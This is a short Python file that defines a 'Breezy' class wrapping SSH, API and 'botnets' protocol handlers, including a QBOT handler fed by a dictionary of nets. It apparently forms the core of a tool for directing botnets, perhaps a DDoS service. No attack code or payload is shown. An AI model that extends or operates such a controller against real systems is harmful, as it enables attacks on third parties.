from utils              import *
from classes            import *
from blacklist          import *

from protocols.api      import *
from protocols.ssh      import *
from protocols.botnets  import *

class Breezy():
    ssh: BreezySSH;
    api: BreezyAPI;
    qbot: BreezyQBOT;

    def __init__(self, servers: dict = {}, apis: dict = {}, nets: dict = {}):
        self.ssh = BreezySSH(servers);
        self.api = BreezyAPI(apis);
        self.qbot = BreezyQBOT(nets);

    